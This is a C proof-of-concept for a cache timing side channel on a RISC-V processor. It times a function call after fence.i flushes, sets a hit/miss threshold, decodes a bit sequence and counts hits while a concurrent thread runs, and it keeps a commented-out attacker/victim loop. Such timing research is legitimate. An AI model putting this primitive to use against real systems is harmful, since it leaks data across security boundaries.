#include <pthread.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


/*
 Other processors may implement the fence.i instruction differently and flush the
 cache. Our processor does not do this. This PoC can still be used to test for the
 specific fence implementation, if it works the implementation is flush based.

 For deatails see:
    - Flush instruction in RISC-V Instruction set manual
    - https://elixir.bootlin.com/linux/v4.15.5/source/arch/riscv/include/asm/cacheflush.h
*/

// ---------------------------------------------------------------------------
static inline uint64_t rdtsc()
{
    uint64_t val;
    asm volatile("rdcycle %0\n"
                 : "=r"(val)::);
    return val;
}

// ---------------------------------------------------------------------------
// On a simple risc-v implementation this might flush the cache
// On our processor this is not sufficient -> eviction sets are necessary
static inline void flush()
{
    asm volatile("fence.i" ::: "memory");
    asm volatile("fence" ::: "memory");
    // asm volatile(".word 0x0020000b" ::: "memory");
}

// ---------------------------------------------------------------------------
static inline void maccess(void *p)
{
    uint64_t val;
    asm volatile("ld %0, %1\n" : "=r"(val) : "m"(p) :);
}

// ---------------------------------------------------------------------------
static inline uint64_t timed_load(void *p)
{
    uint64_t start, end;
    start = rdtsc();
    uint64_t val;
    asm volatile("ld %0, %1\n" : "=r"(val) : "m"(p) :);
    end = rdtsc();
    return end - start;
}

static inline uint64_t timed_call(uint64_t (*p)(uint64_t, uint64_t))
{
    uint64_t start, end;
    asm volatile("rdcycle %0\n" : "=r"(start)::);
    p(0, 0);
    asm volatile("rdcycle %0\n" : "=r"(end)::);
    return end - start;
}

static inline uint64_t timed_call_n_flush(uint64_t (*p)(uint64_t, uint64_t))
{
    uint64_t start, end;
    asm volatile("fence" ::: "memory");
    asm volatile("rdcycle %0\n" : "=r"(start)::);
    asm volatile("fence" ::: "memory");
    p(0, 0);
    asm volatile("fence" ::: "memory");
    asm volatile("rdcycle %0\n" : "=r"(end)::);
    asm volatile("fence" ::: "memory");
    asm volatile("fence.i" ::: "memory");
    asm volatile("fence" ::: "memory");
    return end - start;
}

uint64_t dummy_function(uint64_t x, uint64_t y)
{
    return 0;
}

// uint64_t square(uint64_t x, uint64_t y)
// {
//     return x * x;
// }

uint64_t multiply(uint64_t x, uint64_t y)
{
    return x * y;
}

void multiply_at_any_point(size_t* done)
{
    for (uint64_t i=0; i<100000000; i++)
    {
        // printf("%lu\n", i);
        // sleep(1);
        multiply(983475983475234, 76328742347727);
        // sleep(1);
    }
    printf("Done\n");
    *done = 1;
}

int compare_uint64_t (const void * a, const void * b) 
{
   return ( *(int*)a - *(int*)b );
}
uint64_t median(uint64_t* list, uint64_t size)
{
    uint64_t* sorted = malloc(size * sizeof(uint64_t));
    memcpy(sorted, list, size * sizeof(uint64_t));
    qsort(sorted, size, sizeof(uint64_t), compare_uint64_t);
    uint64_t median = sorted[size / 2];
    free(sorted);
    return median;
}

int main()
{
    // No pthreads on user level riscv so we do a simple poc

    // char victim_arr[1024] = {'a'};

    uint64_t seq[16] = {0,0,1,1,1,0,1,0,0,1,0,1,1,0,1,0};

    uint64_t timings[2] = {0, 0};
    uint64_t chached_timings[10000] = {0};
    uint64_t unchached_timings[10000] = {0};
    uint64_t threshold = 0;
    pthread_t id;

    // get thresholds for cached victim_arr access
    multiply(0, 0);
    for (int i = 0; i < 10000; i++)
    {
        chached_timings[i] = timed_call(multiply);
    }
    for (int i = 0; i < 10000; i++)
    {
        asm volatile("fence.i" ::: "memory");
        asm volatile("fence" ::: "memory");
        unchached_timings[i] = timed_call(multiply);
    }
    printf("cached median = %lu\n", median(chached_timings, 10000));
    printf("uncached median = %lu\n", median(unchached_timings, 10000));
    threshold = (median(chached_timings, 1000) + median(unchached_timings, 1000))/2;

    printf("threshold: %lu\n", threshold);

    asm volatile("fence.i" ::: "memory");
    asm volatile("fence" ::: "memory");

    for (int i=0; i<16; i++)
    {
        if (seq[i] == 0)
        {
            asm volatile("fence.i" ::: "memory");
            asm volatile("fence" ::: "memory");
        } else {
            multiply(0, 0);
        }
        timings[0] = timed_call(multiply);
        if (timings[0] < threshold) 
        {
            printf("1");
        } else {
            printf("0");
        }
    }
    printf("\n");

    size_t done = 0;

    pthread_create(&id, NULL, (void*)multiply_at_any_point, &done);

    // open log.csv
    FILE* fp = fopen("log.csv", "w");

    uint64_t counter = 0;

    asm volatile("fence.i" ::: "memory");
    asm volatile("fence" ::: "memory");

    // usleep(500000);

    while(done == 0)
    {
        timings[0] = timed_call(multiply);
        // printf("%lu\n", timings[0]);
        asm volatile("fence.i" ::: "memory");
        asm volatile("fence" ::: "memory");
        if (timings[0] < threshold)
        {
            counter++;
        }
        // usleep(10000);
    }
    printf("counter: %lu\n", counter);

    fclose(fp);

    // while (1)
    // {
    //     /*
    //      Victim
    //      Get victim idx values into the cache
    //     */
    //     ctr = (ctr + 1) % 6;
    //     flush();
    //     timed_call(dummy_function);
    //     square(0, 0);
    //     // maccess(victim_arr[1]);
    //     // maccess(timed_load);

    //     /*
    //      Attacker
    //      Time both array indices and pick the one with the smaller time i.e
    //      the one that is in cache
    //     */
    //     // square(0, 0);
    //     timings[1] = timed_call(multiply);
    //     timings[0] = timed_call(square);
        
        
    //     printf("%ld %ld: ", timings[0], timings[1]);
    //     if (timings[0] < timings[1]) {
    //         printf("0\n");
    //     } 
    //     else {
    //         printf("1\n");
    //     }
    // }

    return 0;
}
